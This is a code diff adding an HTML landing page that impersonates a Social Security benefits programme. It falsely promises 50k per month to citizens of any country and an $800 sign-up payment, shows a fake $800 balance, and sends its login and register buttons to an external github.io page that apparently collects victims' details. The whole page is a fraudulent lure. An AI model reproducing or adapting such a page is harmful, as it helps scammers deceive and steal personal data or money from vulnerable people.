@@ -1,0 +1,89 @@
+<!DOCTYPE>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>start</title>
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+    background: #fff;
+    font-family: 'Poppins', sans-serif;
+    color: #000;
+}
+.img{
+    border: none;
+    border-radius: 50px;
+     height: 100px;
+     width: 100px;
+     margin-top: 10px;
+}
+.h5{
+    color: #fff;
+    background: #318D5D;
+}
+.select {
+    width: 350px;
+    margin: 1vh auto 0 auto;
+    padding: 20px;
+    background-color: #505761;
+    border-radius: 4px;
+    font-size: 17px;
+    display: flex;
+    flex-wrap: wrap;
+    align-items: stretch;
+    justify-content: auto;
+    color: #fff;
+}
+.select button {
+    background: #293645;
+    color: #fff;
+    border-radius: 5px;
+    border: 0px solid rgba(255, 255, 255, 0.7);
+    padding: 10px 40px;
+    outline: 0;
+    cursor: pointer;
+    display: block;
+    margin: 1px auto 10px;
+    font-size: 20px;
+}
+ .massage {
+     font-size: 13px;
+ }
+</style>
+</head>
+<body>
+    <div>
+    <center>
+<img class="img" src="image/pic.png">
+    </center>
+    <h3>welcome to Social security benefits (ssa)</h3>
+    <h4> now available in any country around the world.
+Receive 50k from the government every month for being a legal citizen of your country.
+</h4>
+    </div>
+    <div class="select">
+        <h5 class="h5">Get your first $800 after joining, apply now to receive income</h5>
+        <button onclick="login()">login</button>
+    <button onclick="register()">register</button>
+    <button onclick="balance()">my balance</button>
+    <span class="massage" id="message3"></span>
+    
+    </div>
+    <script>
+        function balance() {
+var message3 = "your Available balance is $800 login to withdraw balance"; document.getElementById("message3").innerHTML = message3;
+}
+
+        function login() {
+
+window.location.assign("https://cbn-benefits.github.io/second/");
+}
+
+        function register() {
+    window.location.assign("https://cbn-benefits.github.io/second/");
+}
+</script>
+</body>
+</html>
